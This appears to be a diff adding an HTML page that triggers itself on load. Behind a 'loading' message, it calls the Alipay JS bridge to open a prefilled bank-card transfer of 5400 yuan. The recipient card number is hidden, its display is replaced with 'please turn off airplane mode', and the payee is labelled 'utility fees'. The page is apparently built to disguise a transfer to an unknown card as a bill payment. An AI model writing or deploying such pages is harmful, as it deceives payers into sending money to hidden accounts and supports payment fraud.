@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta name="viewport"
+    content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <script type="text/javascript" src="jquery-2.0.3.min.js"></script>
+  <script type="text/javascript" src="alipayjsapi.inc.min.js"></script>
+  <title></title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="main">
+    <div class="pay-main" style="text-align: center;padding-top: 60px;">
+      加载中...
+    </div>
+  </div>
+
+  <script>
+    var money = '5400';
+    var cardNo = '"**** 请关闭飞行模式****"';
+    var bankName = "重庆银行";
+    var bankMark = "CQBANK"
+    var amount = parsePrice(money);
+    var cardIndex = "120000049";
+    var bankAccount = '水电费';
+
+    function goJsPay() {
+      AlipayJSBridge.call('exitApp');
+      var a = {
+        actionType: "toCard",
+        sourceId: "bill",
+        cardNo: cardNo,
+        bankAccount: bankAccount,
+        money: amount,
+        amount: amount,
+        bankMark: bankMark,
+        bankName: bankName,
+        cardIndex: cardIndex,
+        cardChannel: "HISTORY_CARD",
+        cardNoHidden: "true"
+      };
+
+      setTimeout(function () {
+        AlipayJSBridge.call("startApp", {
+          appId: "09999988",
+          param: a
+        }, function (a) { });
+      }, 50)
+    }
+    goJsPay()
+    function parsePrice(str) {
+      if (!str) {
+        return 0.00;
+      }
+      str = parseFloat(str);
+      if (isNaN(str)) {
+        return 0.00;
+      }
+      return str.toFixed(2);
+    };
+  </script>
+</body>
+
+</html>
